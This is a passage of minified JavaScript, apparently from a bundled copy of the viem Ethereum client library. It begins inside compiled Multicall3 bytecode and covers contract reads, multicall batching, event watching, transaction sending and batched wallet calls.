fffffffffffffffffffffffffffffffff16838060400190610905919061138f565b604051610913929190611431565b6000604051808303816000865af19150503d8060008114610950576040519150601f19603f3d011682016040523d82523d6000602084013e610955565b606091505b5082600001836020018290528215151515815250505080516020840135176109cf577f08c379a000000000000000000000000000000000000000000000000000000000600052602060045260176024527f4d756c746963616c6c333a2063616c6c206661696c656400000000000000000060445260646000fd5b8160010191505061087e565b50505092915050565b600045905090565b600041905090565b606060008383905090508067ffffffffffffffff811115610a1857610a176112fa565b5b604051908082528060200260200182016040528015610a5157816020015b610a3e610bd5565b815260200190600190039081610a365790505b5091503660005b82811015610b9c576000848281518110610a7557610a74611329565b5b60200260200101519050868683818110610a9257610a91611329565b5b9050602002810190610aa491906114c7565b9250826000016020810190610ab991906111a7565b73ffffffffffffffffffffffffffffffffffffffff16838060200190610adf919061138f565b604051610aed929190611431565b6000604051808303816000865af19150503d8060008114610b2a576040519150601f19603f3d011682016040523d82523d6000602084013e610b2f565b606091505b508260000183602001829052821515151581525050508715610b90578060000151610b8f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b869061153b565b60405180910390fd5b5b81600101915050610a58565b5050509392505050565b6000806060610bb7600186866107bf565b8093508194508295505050509250925092565b600081409050919050565b6040518060400160405280600015158152602001606081525090565b6000819050919050565b610c0481610bf1565b82525050565b6000602082019050610c1f6000830184610bfb565b92915050565b600080fd5b600080fd5b600080fd5b600080fd5b600080fd5b60008083601f840112610c5457610c53610c2f565b5b8235905067ffffffffffffffff811115610c7157610c70610c34565b5b602083019150836020820283011115610c8d57610c8c610c39565b5b9250929050565b60008060208385031215610cab57610caa610c25565b5b600083013567ffffffffffffffff811115610cc957610cc8610c2a565b5b610cd585828601610c3e565b92509250509250929050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b60008115159050919050565b610d2281610d0d565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610d62578082015181840152602081019050610d47565b83811115610d71576000848401525b50505050565b6000601f19601f8301169050919050565b6000610d9382610d28565b610d9d8185610d33565b9350610dad818560208601610d44565b610db681610d77565b840191505092915050565b6000604083016000830151610dd96000860182610d19565b5060208301518482036020860152610df18282610d88565b9150508091505092915050565b6000610e0a8383610dc1565b905092915050565b6000602082019050919050565b6000610e2a82610ce1565b610e348185610cec565b935083602082028501610e4685610cfd565b8060005b85811015610e825784840389528151610e638582610dfe565b9450610e6e83610e12565b925060208a01995050600181019050610e4a565b50829750879550505050505092915050565b60006020820190508181036000830152610eae8184610e1f565b905092915050565b60008083601f840112610ecc57610ecb610c2f565b5b8235905067ffffffffffffffff811115610ee957610ee8610c34565b5b602083019150836020820283011115610f0557610f04610c39565b5b9250929050565b60008060208385031215610f2357610f22610c25565b5b600083013567ffffffffffffffff811115610f4157610f40610c2a565b5b610f4d85828601610eb6565b92509250509250929050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000610f918383610d88565b905092915050565b6000602082019050919050565b6000610fb182610f59565b610fbb8185610f64565b935083602082028501610fcd85610f75565b8060005b858110156110095784840389528151610fea8582610f85565b9450610ff583610f99565b925060208a01995050600181019050610fd1565b50829750879550505050505092915050565b60006040820190506110306000830185610bfb565b81810360208301526110428184610fa6565b90509392505050565b6000819050919050565b61105e8161104b565b82525050565b60006020820190506110796000830184611055565b92915050565b61108881610d0d565b811461109357600080fd5b50565b6000813590506110a58161107f565b92915050565b6000806000604084860312156110c4576110c3610c25565b5b60006110d286828701611096565b935050602084013567ffffffffffffffff8111156110f3576110f2610c2a565b5b6110ff86828701610eb6565b92509250509250925092565b60006060820190506111206000830186610bfb565b61112d6020830185611055565b818103604083015261113f8184610e1f565b9050949350505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061117482611149565b9050919050565b61118481611169565b811461118f57600080fd5b50565b6000813590506111a18161117b565b92915050565b6000602082840312156111bd576111bc610c25565b5b60006111cb84828501611192565b91505092915050565b60008083601f8401126111ea576111e9610c2f565b5b8235905067ffffffffffffffff81111561120757611206610c34565b5b60208301915083602082028301111561122357611222610c39565b5b9250929050565b6000806020838503121561124157611240610c25565b5b600083013567ffffffffffffffff81111561125f5761125e610c2a565b5b61126b858286016111d4565b92509250509250929050565b61128081611169565b82525050565b600060208201905061129b6000830184611277565b92915050565b6112aa81610bf1565b81146112b557600080fd5b50565b6000813590506112c7816112a1565b92915050565b6000602082840312156112e3576112e2610c25565b5b60006112f1848285016112b8565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600080fd5b600080fd5b600080fd5b60008235600160800383360303811261138357611382611358565b5b80830191505092915050565b600080833560016020038436030381126113ac576113ab611358565b5b80840192508235915067ffffffffffffffff8211156113ce576113cd61135d565b5b6020830192506001820236038313156113ea576113e9611362565b5b509250929050565b600081905092915050565b82818337600083830152505050565b600061141883856113f2565b93506114258385846113fd565b82840190509392505050565b600061143e82848661140c565b91508190509392505050565b600082825260208201905092915050565b7f4d756c746963616c6c333a2076616c7565206d69736d61746368000000000000600082015250565b6000611491601a8361144a565b915061149c8261145b565b602082019050919050565b600060208201905081810360008301526114c081611484565b9050919050565b6000823560016040038336030381126114e3576114e2611358565b5b80830191505092915050565b7f4d756c746963616c6c333a2063616c6c206661696c6564000000000000000000600082015250565b600061152560178361144a565b9150611530826114ef565b602082019050919050565b6000602082019050818103600083015261155481611518565b9050919050565b60008235600160600383360303811261157757611576611358565b5b8083019150509291505056fea264697066735822122020c1bc9aacf8e4a6507193432a895a8e77094f45a1395583f07b24e860ef06cd64736f6c634300080c0033";
class s0 extends F {
    constructor({
        blockNumber: t,
        chain: n,
        contract: r
    }) {
        super(`Chain "${n.name}" does not support contract "${r.name}".`, {
            metaMessages: ["This could be due to any of the following:", ...t && r.blockCreated && r.blockCreated > t ? [`- The contract "${r.name}" was not deployed until block ${r.blockCreated} (current block ${t}).`] : [`- The chain does not have the contract "${r.name}" configured.`]],
            name: "ChainDoesNotSupportContract"
        })
    }
}
class Yv extends F {
    constructor({
        chain: t,
        currentChainId: n
    }) {
        super(`The current chain of the wallet (id: ${n}) does not match the target chain for the transaction (id: ${t.id} – ${t.name}).`, {
            metaMessages: [`Current Chain ID:  ${n}`, `Expected Chain ID: ${t.id} – ${t.name}`],
            name: "ChainMismatchError"
        })
    }
}
class Jv extends F {
    constructor() {
        super(["No chain was provided to the request.", "Please provide a chain with the `chain` argument on the Action, or by supplying a `chain` to WalletClient."].join(`
`), {
            name: "ChainNotFoundError"
        })
    }
}
class Bg extends F {
    constructor() {
        super("No chain was provided to the Client.", {
            name: "ClientChainNotConfiguredError"
        })
    }
}
const eu = "/docs/contract/encodeDeployData";

function wl(e) {
    const {
        abi: t,
        args: n,
        bytecode: r
    } = e;
    if (!n || n.length === 0) return r;
    const s = t.find(o => "type" in o && o.type === "constructor");
    if (!s) throw new Y3({
        docsPath: eu
    });
    if (!("inputs" in s)) throw new Hh({
        docsPath: eu
    });
    if (!s.inputs || s.inputs.length === 0) throw new Hh({
        docsPath: eu
    });
    const i = hs(s.inputs, n);
    return hi([r, i])
}

function mi({
    blockNumber: e,
    chain: t,
    contract: n
}) {
    const r = t?.contracts?.[n];
    if (!r) throw new s0({
        chain: t,
        contract: {
            name: n
        }
    });
    if (e && r.blockCreated && r.blockCreated > e) throw new s0({
        blockNumber: e,
        chain: t,
        contract: {
            name: n,
            blockCreated: r.blockCreated
        }
    });
    return r.address
}

function Lg(e, {
    docsPath: t,
    ...n
}) {
    const r = (() => {
        const s = ml(e, n);
        return s instanceof ea ? e : s
    })();
    return new Yb(r, {
        docsPath: t,
        ...n
    })
}

function od() {
    let e = () => {},
        t = () => {};
    return {
        promise: new Promise((r, s) => {
            e = r, t = s
        }),
        resolve: e,
        reject: t
    }
}
const tu = new Map;

function $g({
    fn: e,
    id: t,
    shouldSplitBatch: n,
    wait: r = 0,
    sort: s
}) {
    const i = async () => {
        const l = c();
        o();
        const f = l.map(({
            args: d
        }) => d);
        f.length !== 0 && e(f).then(d => {
            s && Array.isArray(d) && d.sort(s);
            for (let h = 0; h < l.length; h++) {
                const {
                    resolve: b
                } = l[h];
                b?.([d[h], d])
            }
        }).catch(d => {
            for (let h = 0; h < l.length; h++) {
                const {
                    reject: b
                } = l[h];
                b?.(d)
            }
        })
    }, o = () => tu.delete(t), a = () => c().map(({
        args: l
    }) => l), c = () => tu.get(t) || [], u = l => tu.set(t, [...c(), l]);
    return {
        flush: o,
        async schedule(l) {
            const {
                promise: f,
                resolve: d,
                reject: h
            } = od();
            return n?.([...a(), l]) && i(), c().length > 0 ? (u({
                args: l,
                resolve: d,
                reject: h
            }), f) : (u({
                args: l,
                resolve: d,
                reject: h
            }), setTimeout(i, r), f)
        }
    }
}
async function _l(e, t) {
    const {
        account: n = e.account,
        authorizationList: r,
        batch: s = !!e.batch?.multicall,
        blockNumber: i,
        blockTag: o = e.experimental_blockTag ?? "latest",
        accessList: a,
        blobs: c,
        blockOverrides: u,
        code: l,
        data: f,
        factory: d,
        factoryData: h,
        gas: b,
        gasPrice: m,
        maxFeePerBlobGas: _,
        maxFeePerGas: E,
        maxPriorityFeePerGas: S,
        nonce: g,
        to: p,
        value: w,
        stateOverride: A,
        ...N
    } = t, v = n ? Se(n) : void 0;
    if (l && (d || h)) throw new F("Cannot provide both `code` & `factory`/`factoryData` as parameters.");
    if (l && p) throw new F("Cannot provide both `code` & `to` as parameters.");
    const y = l && f,
        x = d && h && p && f,
        I = y || x,
        T = y ? Dg({
            code: l,
            data: f
        }) : x ? t9({
            data: f,
            factory: d,
            factoryData: h,
            to: p
        }) : f;
    try {
        nr(t);
        const L = (typeof i == "bigint" ? J(i) : void 0) || o,
            k = u ? Pg(u) : void 0,
            R = jf(A),
            D = e.chain?.formatters?.transactionRequest?.format,
            q = (D || Cr)({
                ...pi(N, {
                    format: D
                }),
                accessList: a,
                account: v,
                authorizationList: r,
                blobs: c,
                data: T,
                gas: b,
                gasPrice: m,
                maxFeePerBlobGas: _,
                maxFeePerGas: E,
                maxPriorityFeePerGas: S,
                nonce: g,
                to: I ? void 0 : p,
                value: w
            }, "call");
        if (s && Qv({
                request: q
            }) && !R && !k) try {
            return await e9(e, {
                ...q,
                blockNumber: i,
                blockTag: o
            })
        } catch (le) {
            if (!(le instanceof Bg) && !(le instanceof s0)) throw le
        }
        const Q = (() => {
                const le = [q, L];
                return R && k ? [...le, R, k] : R ? [...le, R] : k ? [...le, {}, k] : le
            })(),
            se = await e.request({
                method: "eth_call",
                params: Q
            });
        return se === "0x" ? {
            data: void 0
        } : {
            data: se
        }
    } catch (O) {
        const L = n9(O),
            {
                offchainLookup: k,
                offchainLookupSignature: R
            } = await Qb(async () => {
                const {
                    offchainLookup: D,
                    offchainLookupSignature: B
                } = await import("./ccip-CFrMUs-i.js");
                return {
                    offchainLookup: D,
                    offchainLookupSignature: B
                }
            }, []);
        if (e.ccipRead !== !1 && L?.slice(0, 10) === R && p) return {
            data: await k(e, {
                data: L,
                to: p
            })
        };
        throw I && L?.slice(0, 10) === "0x101bb98d" ? new P4({
            factory: d
        }) : Lg(O, {
            ...t,
            account: v,
            chain: e.chain
        })
    }
}

function Qv({
    request: e
}) {
    const {
        data: t,
        to: n,
        ...r
    } = e;
    return !(!t || t.startsWith(Xv) || !n || Object.values(r).filter(s => typeof s < "u").length > 0)
}
async function e9(e, t) {
    const {
        batchSize: n = 1024,
        deployless: r = !1,
        wait: s = 0
    } = typeof e.batch?.multicall == "object" ? e.batch.multicall : {}, {
        blockNumber: i,
        blockTag: o = e.experimental_blockTag ?? "latest",
        data: a,
        to: c
    } = t, u = (() => {
        if (r) return null;
        if (t.multicallAddress) return t.multicallAddress;
        if (e.chain) return mi({
            blockNumber: i,
            chain: e.chain,
            contract: "multicall3"
        });
        throw new Bg
    })(), f = (typeof i == "bigint" ? J(i) : void 0) || o, {
        schedule: d
    } = $g({
        id: `${e.uid}.${f}`,
        wait: s,
        shouldSplitBatch(m) {
            return m.reduce((E, {
                data: S
            }) => E + (S.length - 2), 0) > n * 2
        },
        fn: async m => {
            const _ = m.map(g => ({
                    allowFailure: !0,
                    callData: g.data,
                    target: g.to
                })),
                E = Bt({
                    abi: pc,
                    args: [_],
                    functionName: "aggregate3"
                }),
                S = await e.request({
                    method: "eth_call",
                    params: [{
                        ...u === null ? {
                            data: Dg({
                                code: id,
                                data: E
                            })
                        } : {
                            to: u,
                            data: E
                        }
                    }, f]
                });
            return ms({
                abi: pc,
                args: [_],
                functionName: "aggregate3",
                data: S || "0x"
            })
        }
    }), [{
        returnData: h,
        success: b
    }] = await d({
        data: a,
        to: c
    });
    if (!b) throw new hl({
        data: h
    });
    return h === "0x" ? {
        data: void 0
    } : {
        data: h
    }
}

function Dg(e) {
    const {
        code: t,
        data: n
    } = e;
    return wl({
        abi: gb(["constructor(bytes, bytes)"]),
        bytecode: kg,
        args: [t, n]
    })
}

function t9(e) {
    const {
        data: t,
        factory: n,
        factoryData: r,
        to: s
    } = e;
    return wl({
        abi: gb(["constructor(address, bytes, address, bytes)"]),
        bytecode: Kv,
        args: [s, t, n, r]
    })
}

function n9(e) {
    if (!(e instanceof F)) return;
    const t = e.walk();
    return typeof t?.data == "object" ? t.data?.data : t.data
}
async function nn(e, t) {
    const {
        abi: n,
        address: r,
        args: s,
        functionName: i,
        ...o
    } = t, a = Bt({
        abi: n,
        args: s,
        functionName: i
    });
    try {
        const {
            data: c
        } = await Y(e, _l, "call")({
            ...o,
            data: a,
            to: r
        });
        return ms({
            abi: n,
            args: s,
            functionName: i,
            data: c || "0x"
        })
    } catch (c) {
        throw os(c, {
            abi: n,
            address: r,
            args: s,
            docsPath: "/docs/contract/readContract",
            functionName: i
        })
    }
}
async function r9(e, t) {
    const {
        abi: n,
        address: r,
        args: s,
        dataSuffix: i,
        functionName: o,
        ...a
    } = t, c = a.account ? Se(a.account) : e.account, u = Bt({
        abi: n,
        args: s,
        functionName: o
    });
    try {
        const {
            data: l
        } = await Y(e, _l, "call")({
            batch: !1,
            data: `${u}${i?i.replace("0x",""):""}`,
            to: r,
            ...a,
            account: c
        }), f = ms({
            abi: n,
            args: s,
            functionName: o,
            data: l || "0x"
        }), d = n.filter(h => "name" in h && h.name === t.functionName);
        return {
            result: f,
            request: {
                abi: d,
                address: r,
                args: s,
                dataSuffix: i,
                functionName: o,
                ...a,
                account: c
            }
        }
    } catch (l) {
        throw os(l, {
            abi: n,
            address: r,
            args: s,
            docsPath: "/docs/contract/simulateContract",
            functionName: o,
            sender: c?.address
        })
    }
}
const nu = new Map,
    wp = new Map;
let s9 = 0;

function Yn(e, t, n) {
    const r = ++s9,
        s = () => nu.get(e) || [],
        i = () => {
            const l = s();
            nu.set(e, l.filter(f => f.id !== r))
        },
        o = () => {
            const l = s();
            if (!l.some(d => d.id === r)) return;
            const f = wp.get(e);
            if (l.length === 1 && f) {
                const d = f();
                d instanceof Promise && d.catch(() => {})
            }
            i()
        },
        a = s();
    if (nu.set(e, [...a, {
            id: r,
            fns: t
        }]), a && a.length > 0) return o;
    const c = {};
    for (const l in t) c[l] = ((...f) => {
        const d = s();
        if (d.length !== 0)
            for (const h of d) h.fns[l]?.(...f)
    });
    const u = n(c);
    return typeof u == "function" && wp.set(e, u), o
}
async function i0(e) {
    return new Promise(t => setTimeout(t, e))
}

function bi(e, {
    emitOnBegin: t,
    initialWaitTime: n,
    interval: r
}) {
    let s = !0;
    const i = () => s = !1;
    return (async () => {
        let a;
        t && (a = await e({
            unpoll: i
        }));
        const c = await n?.(a) ?? r;
        await i0(c);
        const u = async () => {
            s && (await e({
                unpoll: i
            }), await i0(r), u())
        };
        u()
    })(), i
}
const i9 = new Map,
    o9 = new Map;

function a9(e) {
    const t = (s, i) => ({
            clear: () => i.delete(s),
            get: () => i.get(s),
            set: o => i.set(s, o)
        }),
        n = t(e, i9),
        r = t(e, o9);
    return {
        clear: () => {
            n.clear(), r.clear()
        },
        promise: n,
        response: r
    }
}
async function c9(e, {
    cacheKey: t,
    cacheTime: n = Number.POSITIVE_INFINITY
}) {
    const r = a9(t),
        s = r.response.get();
    if (s && n > 0 && Date.now() - s.created.getTime() < n) return s.data;
    let i = r.promise.get();
    i || (i = e(), r.promise.set(i));
    try {
        const o = await i;
        return r.response.set({
            created: new Date,
            data: o
        }), o
    } finally {
        r.promise.clear()
    }
}
const l9 = e => `blockNumber.${e}`;
async function oa(e, {
    cacheTime: t = e.cacheTime
} = {}) {
    const n = await c9(() => e.request({
        method: "eth_blockNumber"
    }), {
        cacheKey: l9(e.uid),
        cacheTime: t
    });
    return BigInt(n)
}
async function El(e, {
    filter: t
}) {
    const n = "strict" in t && t.strict,
        r = await t.request({
            method: "eth_getFilterChanges",
            params: [t.id]
        });
    if (typeof r[0] == "string") return r;
    const s = r.map(i => Zn(i));
    return !("abi" in t) || !t.abi ? s : Qf({
        abi: t.abi,
        logs: s,
        strict: n
    })
}
async function vl(e, {
    filter: t
}) {
    return t.request({
        method: "eth_uninstallFilter",
        params: [t.id]
    })
}

function u9(e, t) {
    const {
        abi: n,
        address: r,
        args: s,
        batch: i = !0,
        eventName: o,
        fromBlock: a,
        onError: c,
        onLogs: u,
        poll: l,
        pollingInterval: f = e.pollingInterval,
        strict: d
    } = t;
    return (typeof l < "u" ? l : typeof a == "bigint" ? !0 : !(e.transport.type === "webSocket" || e.transport.type === "ipc" || e.transport.type === "fallback" && (e.transport.transports[0].config.type === "webSocket" || e.transport.transports[0].config.type === "ipc"))) ? (() => {
        const _ = d ?? !1,
            E = Be(["watchContractEvent", r, s, i, e.uid, o, f, _, a]);
        return Yn(E, {
            onLogs: u,
            onError: c
        }, S => {
            let g;
            a !== void 0 && (g = a - 1n);
            let p, w = !1;
            const A = bi(async () => {
                if (!w) {
                    try {
                        p = await Y(e, Hb, "createContractEventFilter")({
                            abi: n,
                            address: r,
                            args: s,
                            eventName: o,
                            strict: _,
                            fromBlock: a
                        })
                    } catch {}
                    w = !0;
                    return
                }
                try {
                    let N;
                    if (p) N = await Y(e, El, "getFilterChanges")({
                        filter: p
                    });
                    else {
                        const v = await Y(e, oa, "getBlockNumber")({});
                        g && g < v ? N = await Y(e, pg, "getContractEvents")({
                            abi: n,
                            address: r,
                            args: s,
                            eventName: o,
                            fromBlock: g + 1n,
                            toBlock: v,
                            strict: _
                        }) : N = [], g = v
                    }
                    if (N.length === 0) return;
                    if (i) S.onLogs(N);
                    else
                        for (const v of N) S.onLogs([v])
                } catch (N) {
                    p && N instanceof Er && (w = !1), S.onError?.(N)
                }
            }, {
                emitOnBegin: !0,
                interval: f
            });
            return async () => {
                p && await Y(e, vl, "uninstallFilter")({
                    filter: p
                }), A()
            }
        })
    })() : (() => {
        const _ = d ?? !1,
            E = Be(["watchContractEvent", r, s, i, e.uid, o, f, _]);
        let S = !0,
            g = () => S = !1;
        return Yn(E, {
            onLogs: u,
            onError: c
        }, p => ((async () => {
            try {
                const w = (() => {
                        if (e.transport.type === "fallback") {
                            const v = e.transport.transports.find(y => y.config.type === "webSocket" || y.config.type === "ipc");
                            return v ? v.value : e.transport
                        }
                        return e.transport
                    })(),
                    A = o ? Yo({
                        abi: n,
                        eventName: o,
                        args: s
                    }) : [],
                    {
                        unsubscribe: N
                    } = await w.subscribe({
                        params: ["logs", {
                            address: r,
                            topics: A
                        }],
                        onData(v) {
                            if (!S) return;
                            const y = v.result;
                            try {
                                const {
                                    eventName: x,
                                    args: I
                                } = Jf({
                                    abi: n,
                                    data: y.data,
                                    topics: y.topics,
                                    strict: d
                                }), T = Zn(y, {
                                    args: I,
                                    eventName: x
                                });
                                p.onLogs([T])
                            } catch (x) {
                                let I, T;
                                if (x instanceof oo || x instanceof ll) {
                                    if (d) return;
                                    I = x.abiItem.name, T = x.abiItem.inputs?.some(L => !("name" in L && L.name))
                                }
                                const O = Zn(y, {
                                    args: T ? [] : {},
                                    eventName: I
                                });
                                p.onLogs([O])
                            }
                        },
                        onError(v) {
                            p.onError?.(v)
                        }
                    });
                g = N, S || g()
            } catch (w) {
                c?.(w)
            }
        })(), () => g()))
    })()
}
class Ar extends F {
    constructor({
        docsPath: t
    } = {}) {
        super(["Could not find an Account to execute with this Action.", "Please provide an Account with the `account` argument on the Action, or by supplying an `account` to the Client."].join(`
`), {
            docsPath: t,
            docsSlug: "account",
            name: "AccountNotFoundError"
        })
    }
}
class Yr extends F {
    constructor({
        docsPath: t,
        metaMessages: n,
        type: r
    }) {
        super(`Account type "${r}" is not supported.`, {
            docsPath: t,
            metaMessages: n,
            name: "AccountTypeNotSupportedError"
        })
    }
}

function ad({
    chain: e,
    currentChainId: t
}) {
    if (!e) throw new Jv;
    if (t !== e.id) throw new Yv({
        chain: e,
        currentChainId: t
    })
}
async function cd(e, {
    serializedTransaction: t
}) {
    return e.request({
        method: "eth_sendRawTransaction",
        params: [t]
    }, {
        retryCount: 0
    })
}
const ru = new di(128);
async function Tl(e, t) {
    const {
        account: n = e.account,
        chain: r = e.chain,
        accessList: s,
        authorizationList: i,
        blobs: o,
        data: a,
        gas: c,
        gasPrice: u,
        maxFeePerBlobGas: l,
        maxFeePerGas: f,
        maxPriorityFeePerGas: d,
        nonce: h,
        type: b,
        value: m,
        ..._
    } = t;
    if (typeof n > "u") throw new Ar({
        docsPath: "/docs/actions/wallet/sendTransaction"
    });
    const E = n ? Se(n) : null;
    try {
        nr(t);
        const S = await (async () => {
            if (t.to) return t.to;
            if (t.to !== null && i && i.length > 0) return await pl({
                authorization: i[0]
            }).catch(() => {
                throw new F("`to` is required. Could not infer from `authorizationList`.")
            })
        })();
        if (E?.type === "json-rpc" || E === null) {
            let g;
            r !== null && (g = await Y(e, Ir, "getChainId")({}), ad({
                currentChainId: g,
                chain: r
            }));
            const p = e.chain?.formatters?.transactionRequest?.format,
                A = (p || Cr)({
                    ...pi(_, {
                        format: p
                    }),
                    accessList: s,
                    account: E,
                    authorizationList: i,
                    blobs: o,
                    chainId: g,
                    data: a,
                    gas: c,
                    gasPrice: u,
                    maxFeePerBlobGas: l,
                    maxFeePerGas: f,
                    maxPriorityFeePerGas: d,
                    nonce: h,
                    to: S,
                    type: b,
                    value: m
                }, "sendTransaction"),
                N = ru.get(e.uid),
                v = N ? "wallet_sendTransaction" : "eth_sendTransaction";
            try {
                return await e.request({
                    method: v,
                    params: [A]
                }, {
                    retryCount: 0
                })
            } catch (y) {
                if (N === !1) throw y;
                const x = y;
                if (x.name === "InvalidInputRpcError" || x.name === "InvalidParamsRpcError" || x.name === "MethodNotFoundRpcError" || x.name === "MethodNotSupportedRpcError") return await e.request({
                    method: "wallet_sendTransaction",
                    params: [A]
                }, {
                    retryCount: 0
                }).then(I => (ru.set(e.uid, !0), I)).catch(I => {
                    const T = I;
                    throw T.name === "MethodNotFoundRpcError" || T.name === "MethodNotSupportedRpcError" ? (ru.set(e.uid, !1), x) : T
                });
                throw x
            }
        }
        if (E?.type === "local") {
            const g = await Y(e, ta, "prepareTransactionRequest")({
                    account: E,
                    accessList: s,
                    authorizationList: i,
                    blobs: o,
                    chain: r,
                    data: a,
                    gas: c,
                    gasPrice: u,
                    maxFeePerBlobGas: l,
                    maxFeePerGas: f,
                    maxPriorityFeePerGas: d,
                    nonce: h,
                    nonceManager: E.nonceManager,
                    parameters: [...Zf, "sidecars"],
                    type: b,
                    value: m,
                    ..._,
                    to: S
                }),
                p = r?.serializers?.transaction,
                w = await E.signTransaction(g, {
                    serializer: p
                });
            return await Y(e, cd, "sendRawTransaction")({
                serializedTransaction: w
            })
        }
        throw E?.type === "smart" ? new Yr({
            metaMessages: ["Consider using the `sendUserOperation` Action instead."],
            docsPath: "/docs/actions/bundler/sendUserOperation",
            type: "smart"
        }) : new Yr({
            docsPath: "/docs/actions/wallet/sendTransaction",
            type: E?.type
        })
    } catch (S) {
        throw S instanceof Yr ? S : bl(S, {
            ...t,
            account: E,
            chain: t.chain || void 0
        })
    }
}
async function Po(e, t) {
    return Po.internal(e, Tl, "sendTransaction", t)
}(function(e) {
    async function t(n, r, s, i) {
        const {
            abi: o,
            account: a = n.account,
            address: c,
            args: u,
            dataSuffix: l,
            functionName: f,
            ...d
        } = i;
        if (typeof a > "u") throw new Ar({
            docsPath: "/docs/contract/writeContract"
        });
        const h = a ? Se(a) : null,
            b = Bt({
                abi: o,
                args: u,
                functionName: f
            });
        try {
            return await Y(n, r, s)({
                data: `${b}${l?l.replace("0x",""):""}`,
                to: c,
                account: h,
                ...d
            })
        } catch (m) {
            throw os(m, {
                abi: o,
                address: c,
                args: u,
                docsPath: "/docs/contract/writeContract",
                functionName: f,
                sender: h?.address
            })
        }
    }
    e.internal = t
})(Po || (Po = {}));
class f9 extends F {
    constructor(t) {
        super(`Call bundle failed with status: ${t.statusCode}`, {
            name: "BundleFailedError"
        }), Object.defineProperty(this, "result", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.result = t
    }
}

function mc(e, {
    delay: t = 100,
    retryCount: n = 2,
    shouldRetry: r = () => !0
} = {}) {
    return new Promise((s, i) => {
        const o = async ({
            count: a = 0
        } = {}) => {
            const c = async ({
                error: u
            }) => {
                const l = typeof t == "function" ? t({
                    count: a,
                    error: u
                }) : t;
                l && await i0(l), o({
                    count: a + 1
                })
            };
            try {
                const u = await e();
                s(u)
            } catch (u) {
                if (a < n && await r({
                        count: a,
                        error: u
                    })) return c({
                    error: u
                });
                i(u)
            }
        };
        o()
    })
}
const Fg = {
    "0x0": "reverted",
    "0x1": "success"
};

function Ug(e, t) {
    const n = {
        ...e,
        blockNumber: e.blockNumber ? BigInt(e.blockNumber) : null,
        contractAddress: e.contractAddress ? e.contractAddress : null,
        cumulativeGasUsed: e.cumulativeGasUsed ? BigInt(e.cumulativeGasUsed) : null,
        effectiveGasPrice: e.effectiveGasPrice ? BigInt(e.effectiveGasPrice) : null,
        gasUsed: e.gasUsed ? BigInt(e.gasUsed) : null,
        logs: e.logs ? e.logs.map(r => Zn(r)) : null,
        to: e.to ? e.to : null,
        transactionIndex: e.transactionIndex ? Qt(e.transactionIndex) : null,
        status: e.status ? Fg[e.status] : null,
        type: e.type ? og[e.type] || e.type : null
    };
    return e.blobGasPrice && (n.blobGasPrice = BigInt(e.blobGasPrice)), e.blobGasUsed && (n.blobGasUsed = BigInt(e.blobGasUsed)), n
}
const Vg = "0x5792579257925792579257925792579257925792579257925792579257925792",
    Hg = J(0, {
        size: 32
    });
async function jg(e, t) {
    const {
        account: n = e.account,
        capabilities: r,
        chain: s = e.chain,
        experimental_fallback: i,
        experimental_fallbackDelay: o = 32,
        forceAtomic: a = !1,
        id: c,
        version: u = "2.0.0"
    } = t, l = n ? Se(n) : null, f = t.calls.map(d => {
        const h = d,
            b = h.abi ? Bt({
                abi: h.abi,
                functionName: h.functionName,
                args: h.args
            }) : h.data;
        return {
            data: h.dataSuffix && b ? qt([b, h.dataSuffix]) : b,
            to: h.to,
            value: h.value ? J(h.value) : void 0
        }
    });
    try {
        const d = await e.request({
            method: "wallet_sendCalls",
            params: [{
                atomicRequired: a,
                calls: f,
                capabilities: r,
                chainId: J(s.id),
                from: l?.address,
                id: c,
                version: u
            }]
        }, {
            retryCount: 0
        });
        return typeof d == "string" ? {
            id: d
        } : d
    } catch (d) {
        const h = d;
        if (i && (h.name === "MethodNotFoundRpcError" || h.name === "MethodNotSupportedRpcError" || h.name === "UnknownRpcError" || h.details.toLowerCase().includes("does not exist / is not available") || h.details.toLowerCase().includes("missing or invalid. request()") || h.details.toLowerCase().includes("did not match any variant of untagged enum") || h.details.toLowerCase().includes("account upgraded to unsupported contract") || h.details.toLowerCase().includes("eip-7702 not supported") || h.details.toLowerCase().includes("unsupported wc_ method") || h.details.toLowerCase().includes("feature toggled misconfigured") || h.details.toLowerCase().includes("jsonrpcengine: response has no error or result for request"))) {
            if (r && Object.values(r).some(S => !S.optional)) {
                const S = "non-optional `capabilities` are not supported on fallback to `eth_sendTransaction`.";
                throw new ni(new F(S, {
                    details: S
                }))
            }
            if (a && f.length > 1) {
                const E = "`forceAtomic` is not supported on fallback to `eth_sendTransaction`.";
                throw new ri(new F(E, {
                    details: E
                }))
            }
            const b = [];
            for (const E of f) {
                const S = Tl(e, {
                    account: l,
                    chain: s,
                    data: E.data,
                    to: E.to,
                    value: E.value ? Mt(E.value) : void 0
                });
                b.push(S), o > 0 && await new Promise(g => setTimeout(g, o))
            }
            const m = await Promise.allSettled(b);
            if (m.every(E => E.status === "rejected")) throw m[0].reason;
            const _ = m.map(E => E.status === "fulfilled" ? E.value : Hg);
            return {
                id: qt([..._, J(s.id, {
                    size: 32
                }), Vg])
            }
        }
        throw bl(d, {
            ...t,
            account: l,
            chain: t.chain
        })
    }
}
async function zg(e, t) {
    async function n(l) {
        if (l.endsWith(Vg.slice(2))) {
            const d = xr(zu(l, -64, -32)),
                h = zu(l, 0, -64).slice(2).match(/.{1,64}/g),
                b = await Promise.all(h.map(_ => Hg.slice(2) !== _ ? e.request({
                    method: "eth_getTransactionReceipt",
                    params: [`0x${_}`]
                }, {
                    dedupe: !0
                }) : void 0)),
                m = b.some(_ => _ === null) ? 100 : b.every(_ => _?.status === "0x1") ? 200 : b.every(_ => _?.status === "0x0") ? 500 : 600;
            return {
                atomic: !1,
                chainId: Qt(d),
                receipts: b.filter(Boolean),
                status: m,
                version: "2.0.0"
            }
        }
        return e.request({
            method: "wallet_getCallsStatus",
            params: [l]
        })
    }
    const {
        atomic: r = !1,
        chainId: s,
        receipts: i,
        version: o = "2.0.0",
        ...a
    } = await n(t.id), [c, u] = (() => {
        const l = a.status;
